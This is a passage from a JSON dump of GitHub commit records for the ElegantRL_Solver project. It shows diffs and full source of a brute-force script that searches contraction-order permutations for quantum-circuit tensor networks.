tmp = tmp \/ state[start[i + 1], start[i + 1] - 1]\n            start_new = min(start[i], start[i + 1])\n            end_new = max(end[i], end[i + 1])\n            for __ in range(start_new, end_new + 1):\n                start[__-1] = start_new\n                end[__-1] = end_new\n\n            r += tmp\n        reward[k, permute_i] = r\n    print(reward[k], permute_list[reward[k].min(dim=-1)[1]])\nprint(reward.min(dim=-1)[0].mean())\nwith open(\"record_r.pkl\", \"wb\") as f:\n    import pickle as pkl\n    pkl.dump(reward, f)\n\n"}},"msg":"Update baseline_brute_force.py"},"d715fd62f8ea48ae16c57442ddb998512a51a489":{"url":"https:\/\/api.github.com\/repos\/AI4Finance-Foundation\/ElegantRL_Solver\/commits\/d715fd62f8ea48ae16c57442ddb998512a51a489","html_url":"https:\/\/github.com\/AI4Finance-Foundation\/ElegantRL_Solver\/commit\/d715fd62f8ea48ae16c57442ddb998512a51a489","sha":"d715fd62f8ea48ae16c57442ddb998512a51a489","keyword":"brute force update","diff":"diff --git a\/rlsolver\/rlsolver_quantum_circuits\/baseline_brute_force.py b\/rlsolver\/rlsolver_quantum_circuits\/baseline_brute_force.py\nindex 90b10bd..292b5fc 100644\n--- a\/rlsolver\/rlsolver_quantum_circuits\/baseline_brute_force.py\n+++ b\/rlsolver\/rlsolver_quantum_circuits\/baseline_brute_force.py\n@@ -3,7 +3,8 @@\n from copy import deepcopy\n device = th.device(\"cuda:0\")\n reward = 0\n-N = 4\n+N = 6\n+factorial_N = math.factorial(N-1)\n with open(f\"test_{N}.pkl\", 'rb') as f:\n     a = pkl.load(f)\n num_env = a.shape[0]\n@@ -18,8 +19,8 @@\n [ 0 , 1 , 2 , 3 , 4 ], [ 0 , 1 , 2 , 4 , 3 ], [ 0 , 1 , 3 , 2 , 4 ], [ 0 , 1 , 3 , 4 , 2 ], [ 0 , 1 , 4 , 2 , 3 ], [ 0 , 1 , 4 , 3 , 2 ], [ 0 , 2 , 1 , 3 , 4 ], [ 0 , 2 , 1 , 4 , 3 ], [ 0 , 2 , 3 , 1 , 4 ], [ 0 , 2 , 3 , 4 , 1 ], [ 0 , 2 , 4 , 1 , 3 ], [ 0 , 2 , 4 , 3 , 1 ], [ 0 , 3 , 1 , 2 , 4 ], [ 0 , 3 , 1 , 4 , 2 ], [ 0 , 3 , 2 , 1 , 4 ], [ 0 , 3 , 2 , 4 , 1 ], [ 0 , 3 , 4 , 1 , 2 ], [ 0 , 3 , 4 , 2 , 1 ], [ 0 , 4 , 1 , 2 , 3 ], [ 0 , 4 , 1 , 3 , 2 ], [ 0 , 4 , 2 , 1 , 3 ], [ 0 , 4 , 2 , 3 , 1 ], [ 0 , 4 , 3 , 1 , 2 ], [ 0 , 4 , 3 , 2 , 1 ], [ 1 , 0 , 2 , 3 , 4 ], [ 1 , 0 , 2 , 4 , 3 ], [ 1 , 0 , 3 , 2 , 4 ], [ 1 , 0 , 3 , 4 , 2 ], [ 1 , 0 , 4 , 2 , 3 ], [ 1 , 0 , 4 , 3 , 2 ], [ 1 , 2 , 0 , 3 , 4 ], [ 1 , 2 , 0 , 4 , 3 ], [ 1 , 2 , 3 , 0 , 4 ], [ 1 , 2 , 3 , 4 , 0 ], [ 1 , 2 , 4 , 0 , 3 ], [ 1 , 2 , 4 , 3 , 0 ], [ 1 , 3 , 0 , 2 , 4 ], [ 1 , 3 , 0 , 4 , 2 ], [ 1 , 3 , 2 , 0 , 4 ], [ 1 , 3 , 2 , 4 , 0 ], [ 1 , 3 , 4 , 0 , 2 ], [ 1 , 3 , 4 , 2 , 0 ], [ 1 , 4 , 0 , 2 , 3 ], [ 1 , 4 , 0 , 3 , 2 ], [ 1 , 4 , 2 , 0 , 3 ], [ 1 , 4 , 2 , 3 , 0 ], [ 1 , 4 , 3 , 0 , 2 ], [ 1 , 4 , 3 , 2 , 0 ], [ 2 , 0 , 1 , 3 , 4 ], [ 2 , 0 , 1 , 4 , 3 ], [ 2 , 0 , 3 , 1 , 4 ], [ 2 , 0 , 3 , 4 , 1 ], [ 2 , 0 , 4 , 1 , 3 ], [ 2 , 0 , 4 , 3 , 1 ], [ 2 , 1 , 0 , 3 , 4 ], [ 2 , 1 , 0 , 4 , 3 ], [ 2 , 1 , 3 , 0 , 4 ], [ 2 , 1 , 3 , 4 , 0 ], [ 2 , 1 , 4 , 0 , 3 ], [ 2 , 1 , 4 , 3 , 0 ], [ 2 , 3 , 0 , 1 , 4 ], [ 2 , 3 , 0 , 4 , 1 ], [ 2 , 3 , 1 , 0 , 4 ], [ 2 , 3 , 1 , 4 , 0 ], [ 2 , 3 , 4 , 0 , 1 ], [ 2 , 3 , 4 , 1 , 0 ], [ 2 , 4 , 0 , 1 , 3 ], [ 2 , 4 , 0 , 3 , 1 ], [ 2 , 4 , 1 , 0 , 3 ], [ 2 , 4 , 1 , 3 , 0 ], [ 2 , 4 , 3 , 0 , 1 ], [ 2 , 4 , 3 , 1 , 0 ], [ 3 , 0 , 1 , 2 , 4 ], [ 3 , 0 , 1 , 4 , 2 ], [ 3 , 0 , 2 , 1 , 4 ], [ 3 , 0 , 2 , 4 , 1 ], [ 3 , 0 , 4 , 1 , 2 ], [ 3 , 0 , 4 , 2 , 1 ], [ 3 , 1 , 0 , 2 , 4 ], [ 3 , 1 , 0 , 4 , 2 ], [ 3 , 1 , 2 , 0 , 4 ], [ 3 , 1 , 2 , 4 , 0 ], [ 3 , 1 , 4 , 0 , 2 ], [ 3 , 1 , 4 , 2 , 0 ], [ 3 , 2 , 0 , 1 , 4 ], [ 3 , 2 , 0 , 4 , 1 ], [ 3 , 2 , 1 , 0 , 4 ], [ 3 , 2 , 1 , 4 , 0 ], [ 3 , 2 , 4 , 0 , 1 ], [ 3 , 2 , 4 , 1 , 0 ], [ 3 , 4 , 0 , 1 , 2 ], [ 3 , 4 , 0 , 2 , 1 ], [ 3 , 4 , 1 , 0 , 2 ], [ 3 , 4 , 1 , 2 , 0 ], [ 3 , 4 , 2 , 0 , 1 ], [ 3 , 4 , 2 , 1 , 0 ], [ 4 , 0 , 1 , 2 , 3 ], [ 4 , 0 , 1 , 3 , 2 ], [ 4 , 0 , 2 , 1 , 3 ], [ 4 , 0 , 2 , 3 , 1 ], [ 4 , 0 , 3 , 1 , 2 ], [ 4 , 0 , 3 , 2 , 1 ], [ 4 , 1 , 0 , 2 , 3 ], [ 4 , 1 , 0 , 3 , 2 ], [ 4 , 1 , 2 , 0 , 3 ], [ 4 , 1 , 2 , 3 , 0 ], [ 4 , 1 , 3 , 0 , 2 ], [ 4 , 1 , 3 , 2 , 0 ], [ 4 , 2 , 0 , 1 , 3 ], [ 4 , 2 , 0 , 3 , 1 ], [ 4 , 2 , 1 , 0 , 3 ], [ 4 , 2 , 1 , 3 , 0 ], [ 4 , 2 , 3 , 0 , 1 ], [ 4 , 2 , 3 , 1 , 0 ], [ 4 , 3 , 0 , 1 , 2 ], [ 4 , 3 , 0 , 2 , 1 ], [ 4 , 3 , 1 , 0 , 2 ], [ 4 , 3 , 1 , 2 , 0 ], [ 4 , 3 , 2 , 0 , 1 ], [ 4 , 3 , 2 , 1 , 0 ],\n ])\n \n-for k in range(a.shape[0]):\n-    for permute_i in range(6):\n+for k in range(num_env):\n+    for permute_i in range(factorial_N):\n         permute = permute_list[permute_i]\n         r = 0\n         state = a[k]\n","message":"","files":{"\/rlsolver\/rlsolver_quantum_circuits\/baseline_brute_force.py":{"changes":[{"diff":"\n from copy import deepcopy\n device = th.device(\"cuda:0\")\n reward = 0\n-N = 4\n+N = 6\n+factorial_N = math.factorial(N-1)\n with open(f\"test_{N}.pkl\", 'rb') as f:\n     a = pkl.load(f)\n num_env = a.shape[0]\n","add":2,"remove":1,"filename":"\/rlsolver\/rlsolver_quantum_circuits\/baseline_brute_force.py","badparts":["N = 4"],"goodparts":["N = 6","factorial_N = math.factorial(N-1)"]},{"diff":" [ 0 , 1 , 2 , 3 , 4 ], [ 0 , 1 , 2 , 4 , 3 ], [ 0 , 1 , 3 , 2 , 4 ], [ 0 , 1 , 3 , 4 , 2 ], [ 0 , 1 , 4 , 2 , 3 ], [ 0 , 1 , 4 , 3 , 2 ], [ 0 , 2 , 1 , 3 , 4 ], [ 0 , 2 , 1 , 4 , 3 ], [ 0 , 2 , 3 , 1 , 4 ], [ 0 , 2 , 3 , 4 , 1 ], [ 0 , 2 , 4 , 1 , 3 ], [ 0 , 2 , 4 , 3 , 1 ], [ 0 , 3 , 1 , 2 , 4 ], [ 0 , 3 , 1 , 4 , 2 ], [ 0 , 3 , 2 , 1 , 4 ], [ 0 , 3 , 2 , 4 , 1 ], [ 0 , 3 , 4 , 1 , 2 ], [ 0 , 3 , 4 , 2 , 1 ], [ 0 , 4 , 1 , 2 , 3 ], [ 0 , 4 , 1 , 3 , 2 ], [ 0 , 4 , 2 , 1 , 3 ], [ 0 , 4 , 2 , 3 , 1 ], [ 0 , 4 , 3 , 1 , 2 ], [ 0 , 4 , 3 , 2 , 1 ], [ 1 , 0 , 2 , 3 , 4 ], [ 1 , 0 , 2 , 4 , 3 ], [ 1 , 0 , 3 , 2 , 4 ], [ 1 , 0 , 3 , 4 , 2 ], [ 1 , 0 , 4 , 2 , 3 ], [ 1 , 0 , 4 , 3 , 2 ], [ 1 , 2 , 0 , 3 , 4 ], [ 1 , 2 , 0 , 4 , 3 ], [ 1 , 2 , 3 , 0 , 4 ], [ 1 , 2 , 3 , 4 , 0 ], [ 1 , 2 , 4 , 0 , 3 ], [ 1 , 2 , 4 , 3 , 0 ], [ 1 , 3 , 0 , 2 , 4 ], [ 1 , 3 , 0 , 4 , 2 ], [ 1 , 3 , 2 , 0 , 4 ], [ 1 , 3 , 2 , 4 , 0 ], [ 1 , 3 , 4 , 0 , 2 ], [ 1 , 3 , 4 , 2 , 0 ], [ 1 , 4 , 0 , 2 , 3 ], [ 1 , 4 , 0 , 3 , 2 ], [ 1 , 4 , 2 , 0 , 3 ], [ 1 , 4 , 2 , 3 , 0 ], [ 1 , 4 , 3 , 0 , 2 ], [ 1 , 4 , 3 , 2 , 0 ], [ 2 , 0 , 1 , 3 , 4 ], [ 2 , 0 , 1 , 4 , 3 ], [ 2 , 0 , 3 , 1 , 4 ], [ 2 , 0 , 3 , 4 , 1 ], [ 2 , 0 , 4 , 1 , 3 ], [ 2 , 0 , 4 , 3 , 1 ], [ 2 , 1 , 0 , 3 , 4 ], [ 2 , 1 , 0 , 4 , 3 ], [ 2 , 1 , 3 , 0 , 4 ], [ 2 , 1 , 3 , 4 , 0 ], [ 2 , 1 , 4 , 0 , 3 ], [ 2 , 1 , 4 , 3 , 0 ], [ 2 , 3 , 0 , 1 , 4 ], [ 2 , 3 , 0 , 4 , 1 ], [ 2 , 3 , 1 , 0 , 4 ], [ 2 , 3 , 1 , 4 , 0 ], [ 2 , 3 , 4 , 0 , 1 ], [ 2 , 3 , 4 , 1 , 0 ], [ 2 , 4 , 0 , 1 , 3 ], [ 2 , 4 , 0 , 3 , 1 ], [ 2 , 4 , 1 , 0 , 3 ], [ 2 , 4 , 1 , 3 , 0 ], [ 2 , 4 , 3 , 0 , 1 ], [ 2 , 4 , 3 , 1 , 0 ], [ 3 , 0 , 1 , 2 , 4 ], [ 3 , 0 , 1 , 4 , 2 ], [ 3 , 0 , 2 , 1 , 4 ], [ 3 , 0 , 2 , 4 , 1 ], [ 3 , 0 , 4 , 1 , 2 ], [ 3 , 0 , 4 , 2 , 1 ], [ 3 , 1 , 0 , 2 , 4 ], [ 3 , 1 , 0 , 4 , 2 ], [ 3 , 1 , 2 , 0 , 4 ], [ 3 , 1 , 2 , 4 , 0 ], [ 3 , 1 , 4 , 0 , 2 ], [ 3 , 1 , 4 , 2 , 0 ], [ 3 , 2 , 0 , 1 , 4 ], [ 3 , 2 , 0 , 4 , 1 ], [ 3 , 2 , 1 , 0 , 4 ], [ 3 , 2 , 1 , 4 , 0 ], [ 3 , 2 , 4 , 0 , 1 ], [ 3 , 2 , 4 , 1 , 0 ], [ 3 , 4 , 0 , 1 , 2 ], [ 3 , 4 , 0 , 2 , 1 ], [ 3 , 4 , 1 , 0 , 2 ], [ 3 , 4 , 1 , 2 , 0 ], [ 3 , 4 , 2 , 0 , 1 ], [ 3 , 4 , 2 , 1 , 0 ], [ 4 , 0 , 1 , 2 , 3 ], [ 4 , 0 , 1 , 3 , 2 ], [ 4 , 0 , 2 , 1 , 3 ], [ 4 , 0 , 2 , 3 , 1 ], [ 4 , 0 , 3 , 1 , 2 ], [ 4 , 0 , 3 , 2 , 1 ], [ 4 , 1 , 0 , 2 , 3 ], [ 4 , 1 , 0 , 3 , 2 ], [ 4 , 1 , 2 , 0 , 3 ], [ 4 , 1 , 2 , 3 , 0 ], [ 4 , 1 , 3 , 0 , 2 ], [ 4 , 1 , 3 , 2 , 0 ], [ 4 , 2 , 0 , 1 , 3 ], [ 4 , 2 , 0 , 3 , 1 ], [ 4 , 2 , 1 , 0 , 3 ], [ 4 , 2 , 1 , 3 , 0 ], [ 4 , 2 , 3 , 0 , 1 ], [ 4 , 2 , 3 , 1 , 0 ], [ 4 , 3 , 0 , 1 , 2 ], [ 4 , 3 , 0 , 2 , 1 ], [ 4 , 3 , 1 , 0 , 2 ], [ 4 , 3 , 1 , 2 , 0 ], [ 4 , 3 , 2 , 0 , 1 ], [ 4 , 3 , 2 , 1 , 0 ],\n ])\n \n-for k in range(a.shape[0]):\n-    for permute_i in range(6):\n+for k in range(num_env):\n+    for permute_i in range(factorial_N):\n         permute = permute_list[permute_i]\n         r = 0\n         state = a[k]\n","add":2,"remove":2,"filename":"\/rlsolver\/rlsolver_quantum_circuits\/baseline_brute_force.py","badparts":["for k in range(a.shape[0]):","    for permute_i in range(6):"],"goodparts":["for k in range(num_env):","    for permute_i in range(factorial_N):"]}],"source":"\nimport pickle as pkl import torch as th from copy import deepcopy device=th.device(\"cuda:0\") reward=0 N=4 with open(f\"test_{N}.pkl\", 'rb') as f: a=pkl.load(f) num_env=a.shape[0] start_= th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device) end_= th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device) reward=th.zeros(num_env, 6) with open(f\"test_{N}.pkl\", 'rb') as f: a=pkl.load(f) permute_list=th.as_tensor([ [ 0, 1, 2, 3, 4],[ 0, 1, 2, 4, 3],[ 0, 1, 3, 2, 4],[ 0, 1, 3, 4, 2],[ 0, 1, 4, 2, 3],[ 0, 1, 4, 3, 2],[ 0, 2, 1, 3, 4],[ 0, 2, 1, 4, 3],[ 0, 2, 3, 1, 4],[ 0, 2, 3, 4, 1],[ 0, 2, 4, 1, 3],[ 0, 2, 4, 3, 1],[ 0, 3, 1, 2, 4],[ 0, 3, 1, 4, 2],[ 0, 3, 2, 1, 4],[ 0, 3, 2, 4, 1],[ 0, 3, 4, 1, 2],[ 0, 3, 4, 2, 1],[ 0, 4, 1, 2, 3],[ 0, 4, 1, 3, 2],[ 0, 4, 2, 1, 3],[ 0, 4, 2, 3, 1],[ 0, 4, 3, 1, 2],[ 0, 4, 3, 2, 1],[ 1, 0, 2, 3, 4],[ 1, 0, 2, 4, 3],[ 1, 0, 3, 2, 4],[ 1, 0, 3, 4, 2],[ 1, 0, 4, 2, 3],[ 1, 0, 4, 3, 2],[ 1, 2, 0, 3, 4],[ 1, 2, 0, 4, 3],[ 1, 2, 3, 0, 4],[ 1, 2, 3, 4, 0],[ 1, 2, 4, 0, 3],[ 1, 2, 4, 3, 0],[ 1, 3, 0, 2, 4],[ 1, 3, 0, 4, 2],[ 1, 3, 2, 0, 4],[ 1, 3, 2, 4, 0],[ 1, 3, 4, 0, 2],[ 1, 3, 4, 2, 0],[ 1, 4, 0, 2, 3],[ 1, 4, 0, 3, 2],[ 1, 4, 2, 0, 3],[ 1, 4, 2, 3, 0],[ 1, 4, 3, 0, 2],[ 1, 4, 3, 2, 0],[ 2, 0, 1, 3, 4],[ 2, 0, 1, 4, 3],[ 2, 0, 3, 1, 4],[ 2, 0, 3, 4, 1],[ 2, 0, 4, 1, 3],[ 2, 0, 4, 3, 1],[ 2, 1, 0, 3, 4],[ 2, 1, 0, 4, 3],[ 2, 1, 3, 0, 4],[ 2, 1, 3, 4, 0],[ 2, 1, 4, 0, 3],[ 2, 1, 4, 3, 0],[ 2, 3, 0, 1, 4],[ 2, 3, 0, 4, 1],[ 2, 3, 1, 0, 4],[ 2, 3, 1, 4, 0],[ 2, 3, 4, 0, 1],[ 2, 3, 4, 1, 0],[ 2, 4, 0, 1, 3],[ 2, 4, 0, 3, 1],[ 2, 4, 1, 0, 3],[ 2, 4, 1, 3, 0],[ 2, 4, 3, 0, 1],[ 2, 4, 3, 1, 0],[ 3, 0, 1, 2, 4],[ 3, 0, 1, 4, 2],[ 3, 0, 2, 1, 4],[ 3, 0, 2, 4, 1],[ 3, 0, 4, 1, 2],[ 3, 0, 4, 2, 1],[ 3, 1, 0, 2, 4],[ 3, 1, 0, 4, 2],[ 3, 1, 2, 0, 4],[ 3, 1, 2, 4, 0],[ 3, 1, 4, 0, 2],[ 3, 1, 4, 2, 0],[ 3, 2, 0, 1, 4],[ 3, 2, 0, 4, 1],[ 3, 2, 1, 0, 4],[ 3, 2, 1, 4, 0],[ 3, 2, 4, 0, 1],[ 3, 2, 4, 1, 0],[ 3, 4, 0, 1, 2],[ 3, 4, 0, 2, 1],[ 3, 4, 1, 0, 2],[ 3, 4, 1, 2, 0],[ 3, 4, 2, 0, 1],[ 3, 4, 2, 1, 0],[ 4, 0, 1, 2, 3],[ 4, 0, 1, 3, 2],[ 4, 0, 2, 1, 3],[ 4, 0, 2, 3, 1],[ 4, 0, 3, 1, 2],[ 4, 0, 3, 2, 1],[ 4, 1, 0, 2, 3],[ 4, 1, 0, 3, 2],[ 4, 1, 2, 0, 3],[ 4, 1, 2, 3, 0],[ 4, 1, 3, 0, 2],[ 4, 1, 3, 2, 0],[ 4, 2, 0, 1, 3],[ 4, 2, 0, 3, 1],[ 4, 2, 1, 0, 3],[ 4, 2, 1, 3, 0],[ 4, 2, 3, 0, 1],[ 4, 2, 3, 1, 0],[ 4, 3, 0, 1, 2],[ 4, 3, 0, 2, 1],[ 4, 3, 1, 0, 2],[ 4, 3, 1, 2, 0],[ 4, 3, 2, 0, 1],[ 4, 3, 2, 1, 0], ]) for k in range(a.shape[0]): for permute_i in range(6): permute=permute_list[permute_i] r=0 state=a[k] start=deepcopy(start_[k]) +1 end=deepcopy(end_[k]) +1 for i in permute: tmp=1 for j in range(start[i], end[i] +1): tmp *=(state[j, j] * state[j, start[i] -1] * state[end[i] +1, j]) for j in range(start[i +1], end[i +1] +1): tmp *=(state[j, j] * state[j, start[i +1] -1] * state[end[i +1] +1, j]) tmp \/ state[start[i +1], start[i +1] -1] start_new=min(start[i], start[i +1]) end_new=max(end[i], end[i +1]) for __ in range(start_new, end_new +1): start[__-1]=start_new end[__-1]=end_new r +=tmp reward[k, permute_i]=r print(reward[k], reward[k].min()) print(reward.min(dim=-1)) print(reward.min(dim=-1)[0].mean()) with open(\"record_r.pkl\", \"wb\") as f: import pickle as pkl pkl.dump(reward, f) ","sourceWithComments":"import pickle as pkl\nimport torch as th\nfrom copy import deepcopy\ndevice = th.device(\"cuda:0\")\nreward = 0\nN = 4\nwith open(f\"test_{N}.pkl\", 'rb') as f:\n    a = pkl.load(f)\nnum_env = a.shape[0]\nstart_ =  th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\nend_ =  th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\nreward = th.zeros(num_env, 6)\nwith open(f\"test_{N}.pkl\", 'rb') as f:\n    a = pkl.load(f)\n# permute_list = th.as_tensor([[0, 1, 2], [0, 2, 1], [1, 0, 2], [1, 2, 0], [2, 0, 1], [2, 1, 0]])\n\npermute_list = th.as_tensor([\n[ 0 , 1 , 2 , 3 , 4 ], [ 0 , 1 , 2 , 4 , 3 ], [ 0 , 1 , 3 , 2 , 4 ], [ 0 , 1 , 3 , 4 , 2 ], [ 0 , 1 , 4 , 2 , 3 ], [ 0 , 1 , 4 , 3 , 2 ], [ 0 , 2 , 1 , 3 , 4 ], [ 0 , 2 , 1 , 4 , 3 ], [ 0 , 2 , 3 , 1 , 4 ], [ 0 , 2 , 3 , 4 , 1 ], [ 0 , 2 , 4 , 1 , 3 ], [ 0 , 2 , 4 , 3 , 1 ], [ 0 , 3 , 1 , 2 , 4 ], [ 0 , 3 , 1 , 4 , 2 ], [ 0 , 3 , 2 , 1 , 4 ], [ 0 , 3 , 2 , 4 , 1 ], [ 0 , 3 , 4 , 1 , 2 ], [ 0 , 3 , 4 , 2 , 1 ], [ 0 , 4 , 1 , 2 , 3 ], [ 0 , 4 , 1 , 3 , 2 ], [ 0 , 4 , 2 , 1 , 3 ], [ 0 , 4 , 2 , 3 , 1 ], [ 0 , 4 , 3 , 1 , 2 ], [ 0 , 4 , 3 , 2 , 1 ], [ 1 , 0 , 2 , 3 , 4 ], [ 1 , 0 , 2 , 4 , 3 ], [ 1 , 0 , 3 , 2 , 4 ], [ 1 , 0 , 3 , 4 , 2 ], [ 1 , 0 , 4 , 2 , 3 ], [ 1 , 0 , 4 , 3 , 2 ], [ 1 , 2 , 0 , 3 , 4 ], [ 1 , 2 , 0 , 4 , 3 ], [ 1 , 2 , 3 , 0 , 4 ], [ 1 , 2 , 3 , 4 , 0 ], [ 1 , 2 , 4 , 0 , 3 ], [ 1 , 2 , 4 , 3 , 0 ], [ 1 , 3 , 0 , 2 , 4 ], [ 1 , 3 , 0 , 4 , 2 ], [ 1 , 3 , 2 , 0 , 4 ], [ 1 , 3 , 2 , 4 , 0 ], [ 1 , 3 , 4 , 0 , 2 ], [ 1 , 3 , 4 , 2 , 0 ], [ 1 , 4 , 0 , 2 , 3 ], [ 1 , 4 , 0 , 3 , 2 ], [ 1 , 4 , 2 , 0 , 3 ], [ 1 , 4 , 2 , 3 , 0 ], [ 1 , 4 , 3 , 0 , 2 ], [ 1 , 4 , 3 , 2 , 0 ], [ 2 , 0 , 1 , 3 , 4 ], [ 2 , 0 , 1 , 4 , 3 ], [ 2 , 0 , 3 , 1 , 4 ], [ 2 , 0 , 3 , 4 , 1 ], [ 2 , 0 , 4 , 1 , 3 ], [ 2 , 0 , 4 , 3 , 1 ], [ 2 , 1 , 0 , 3 , 4 ], [ 2 , 1 , 0 , 4 , 3 ], [ 2 , 1 , 3 , 0 , 4 ], [ 2 , 1 , 3 , 4 , 0 ], [ 2 , 1 , 4 , 0 , 3 ], [ 2 , 1 , 4 , 3 , 0 ], [ 2 , 3 , 0 , 1 , 4 ], [ 2 , 3 , 0 , 4 , 1 ], [ 2 , 3 , 1 , 0 , 4 ], [ 2 , 3 , 1 , 4 , 0 ], [ 2 , 3 , 4 , 0 , 1 ], [ 2 , 3 , 4 , 1 , 0 ], [ 2 , 4 , 0 , 1 , 3 ], [ 2 , 4 , 0 , 3 , 1 ], [ 2 , 4 , 1 , 0 , 3 ], [ 2 , 4 , 1 , 3 , 0 ], [ 2 , 4 , 3 , 0 , 1 ], [ 2 , 4 , 3 , 1 , 0 ], [ 3 , 0 , 1 , 2 , 4 ], [ 3 , 0 , 1 , 4 , 2 ], [ 3 , 0 , 2 , 1 , 4 ], [ 3 , 0 , 2 , 4 , 1 ], [ 3 , 0 , 4 , 1 , 2 ], [ 3 , 0 , 4 , 2 , 1 ], [ 3 , 1 , 0 , 2 , 4 ], [ 3 , 1 , 0 , 4 , 2 ], [ 3 , 1 , 2 , 0 , 4 ], [ 3 , 1 , 2 , 4 , 0 ], [ 3 , 1 , 4 , 0 , 2 ], [ 3 , 1 , 4 , 2 , 0 ], [ 3 , 2 , 0 , 1 , 4 ], [ 3 , 2 , 0 , 4 , 1 ], [ 3 , 2 , 1 , 0 , 4 ], [ 3 , 2 , 1 , 4 , 0 ], [ 3 , 2 , 4 , 0 , 1 ], [ 3 , 2 , 4 , 1 , 0 ], [ 3 , 4 , 0 , 1 , 2 ], [ 3 , 4 , 0 , 2 , 1 ], [ 3 , 4 , 1 , 0 , 2 ], [ 3 , 4 , 1 , 2 , 0 ], [ 3 , 4 , 2 , 0 , 1 ], [ 3 , 4 , 2 , 1 , 0 ], [ 4 , 0 , 1 , 2 , 3 ], [ 4 , 0 , 1 , 3 , 2 ], [ 4 , 0 , 2 , 1 , 3 ], [ 4 , 0 , 2 , 3 , 1 ], [ 4 , 0 , 3 , 1 , 2 ], [ 4 , 0 , 3 , 2 , 1 ], [ 4 , 1 , 0 , 2 , 3 ], [ 4 , 1 , 0 , 3 , 2 ], [ 4 , 1 , 2 , 0 , 3 ], [ 4 , 1 , 2 , 3 , 0 ], [ 4 , 1 , 3 , 0 , 2 ], [ 4 , 1 , 3 , 2 , 0 ], [ 4 , 2 , 0 , 1 , 3 ], [ 4 , 2 , 0 , 3 , 1 ], [ 4 , 2 , 1 , 0 , 3 ], [ 4 , 2 , 1 , 3 , 0 ], [ 4 , 2 , 3 , 0 , 1 ], [ 4 , 2 , 3 , 1 , 0 ], [ 4 , 3 , 0 , 1 , 2 ], [ 4 , 3 , 0 , 2 , 1 ], [ 4 , 3 , 1 , 0 , 2 ], [ 4 , 3 , 1 , 2 , 0 ], [ 4 , 3 , 2 , 0 , 1 ], [ 4 , 3 , 2 , 1 , 0 ],\n])\n\nfor k in range(a.shape[0]):\n    for permute_i in range(6):\n        permute = permute_list[permute_i]\n        r = 0\n        state = a[k]\n        start = deepcopy(start_[k]) + 1\n        end = deepcopy(end_[k]) + 1\n        for i in permute:\n            tmp = 1\n            for j in range(start[i], end[i] + 1):\n                tmp *= (state[j, j] * state[j, start[i] - 1] * state[end[i] + 1, j])\n            for j in range(start[i + 1], end[i + 1] + 1):\n                tmp *= (state[j, j] * state[j, start[i + 1] - 1] * state[end[i + 1] + 1, j])\n            tmp \/ state[start[i + 1], start[i + 1] - 1]\n            start_new = min(start[i], start[i + 1])\n            end_new = max(end[i], end[i + 1])\n            for __ in range(start_new, end_new + 1):\n                start[__-1] = start_new\n                end[__-1] = end_new\n            r += tmp\n        reward[k, permute_i] = r\n    print(reward[k], reward[k].min())\n    #assert 0\nprint(reward.min(dim = -1))\nprint(reward.min(dim = -1)[0].mean())\nwith open(\"record_r.pkl\", \"wb\") as f:\n    import pickle as pkl\n    pkl.dump(reward, f)\n"}},"msg":"Update baseline_brute_force.py"},"1847940e62d87e9581a1302a3ff6f5ef75c4fd7c":{"url":"https:\/\/api.github.com\/repos\/AI4Finance-Foundation\/ElegantRL_Solver\/commits\/1847940e62d87e9581a1302a3ff6f5ef75c4fd7c","html_url":"https:\/\/github.com\/AI4Finance-Foundation\/ElegantRL_Solver\/commit\/1847940e62d87e9581a1302a3ff6f5ef75c4fd7c","sha":"1847940e62d87e9581a1302a3ff6f5ef75c4fd7c","keyword":"brute force update","diff":"diff --git a\/rlsolver\/rlsolver_quantum_circuits\/Preliminary_Preparation\/baseline_brute_force.py b\/rlsolver\/rlsolver_quantum_circuits\/Preliminary_Preparation\/baseline_brute_force.py\nindex 6346b89..b75cb35 100644\n--- a\/rlsolver\/rlsolver_quantum_circuits\/Preliminary_Preparation\/baseline_brute_force.py\n+++ b\/rlsolver\/rlsolver_quantum_circuits\/Preliminary_Preparation\/baseline_brute_force.py\n@@ -1,5 +1,6 @@\n import pickle as pkl\r\n import torch as th\r\n+import math\r\n from copy import deepcopy\r\n device = th.device(\"cuda:0\")\r\n reward = 0\r\n@@ -42,4 +43,4 @@\n print(reward.min(dim = -1)[0].mean())\r\n with open(\"record_r.pkl\", \"wb\") as f:\r\n     import pickle as pkl\r\n-    pkl.dump(reward, f)\n\\ No newline at end of file\n+    pkl.dump(reward, f)\r\n","message":"","files":{"\/rlsolver\/rlsolver_quantum_circuits\/Preliminary_Preparation\/baseline_brute_force.py":{"changes":[{"diff":" print(reward.min(dim = -1)[0].mean())\r\n with open(\"record_r.pkl\", \"wb\") as f:\r\n     import pickle as pkl\r\n-    pkl.dump(reward, f)\n\\ No newline at end of file\n+    pkl.dump(reward, f)\r\n","add":1,"remove":1,"filename":"\/rlsolver\/rlsolver_quantum_circuits\/Preliminary_Preparation\/baseline_brute_force.py","badparts":["    pkl.dump(reward, f)"],"goodparts":["    pkl.dump(reward, f)\r"]}],"source":"\nimport pickle as pkl\r import torch as th\r from copy import deepcopy\r device=th.device(\"cuda:0\")\r reward=0\r N=4\r factorial_N=math.factorial(N-1)\r with open(f\"test_{N}.pkl\", 'rb') as f:\r a=pkl.load(f)\r num_env=a.shape[0]\r start_= th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r end_= th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r reward=th.zeros(num_env, 6)\r with open(f\"test_{N}.pkl\", 'rb') as f:\r a=pkl.load(f)\r permute_list=th.as_tensor([[0, 1, 2],[0, 2, 1],[1, 0, 2],[1, 2, 0],[2, 0, 1],[2, 1, 0]])\r for k in range(num_env):\r for permute_i in range(factorial_N):\r permute=permute_list[permute_i]\r r=0\r state=a[k]\r start=deepcopy(start_[k]) +1\r end=deepcopy(end_[k]) +1\r for i in permute:\r tmp=1\r for j in range(start[i], end[i] +1):\r tmp *=(state[j, j] * state[j, start[i] -1] * state[end[i] +1, j])\r for j in range(start[i +1], end[i +1] +1):\r tmp *=(state[j, j] * state[j, start[i +1] -1] * state[end[i +1] +1, j])\r tmp \/ state[start[i +1], start[i +1] -1]\r start_new=min(start[i], start[i +1])\r end_new=max(end[i], end[i +1])\r for __ in range(start_new, end_new +1):\r start[__-1]=start_new\r end[__-1]=end_new\r r +=tmp\r reward[k, permute_i]=r\r print(reward[k], reward[k].min())\r 